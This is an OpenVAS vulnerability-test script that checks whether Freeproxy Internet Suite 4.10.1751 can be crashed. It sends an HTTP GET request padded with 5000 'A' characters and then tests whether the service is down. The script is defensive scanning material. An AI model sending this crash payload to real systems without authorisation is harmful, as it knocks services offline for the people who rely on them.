###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_freeproxy_internet_suite_dos_vul.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Freeproxy Internet Suite Denial of Service Vulnerability
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:freeproxy_internet_suite:freeproxy";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.806895");
  script_version("$Revision: 13659 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2016-05-17 11:03:06 +0530 (Tue, 17 May 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Freeproxy Internet Suite Denial of Service Vulnerability");

  script_tag(name:"summary", value:"This host is installed with Freeproxy
  Internet Suite and is prone to denial of service vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
  and check whether it is able to crash the application or not.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of
  GET request to the proxy.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to cause the application to crash, creating a denial-of-service
  condition.");

  script_tag(name:"affected", value:"Freeproxy Internet Suite 4.10.1751");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39517/");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_freeproxy_internet_suite_detect.nasl");
  script_mandatory_keys("Freeproxy/installed");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

freePort = get_app_port(cpe:CPE);
if(!freePort){
  exit(0);
}

if(http_is_dead(port:freePort)){
  exit(0);
}

junk = crap( data:"A", length:5000 );

useragent = http_get_user_agent();

buffer  = 'GET http://::../'+junk+'/index.html HTTP/1.1\r\n'+
 	  'Host: www.xyz.com\r\n'+
	  'User-Agent: ' + useragent + '\r\n' +
	  '\r\n\r\n';

req = http_keepalive_send_recv(port:freePort, data:buffer);

sleep(3);

if(http_is_dead(port:freePort))
{
  security_message(port:freePort);
}
exit(0);
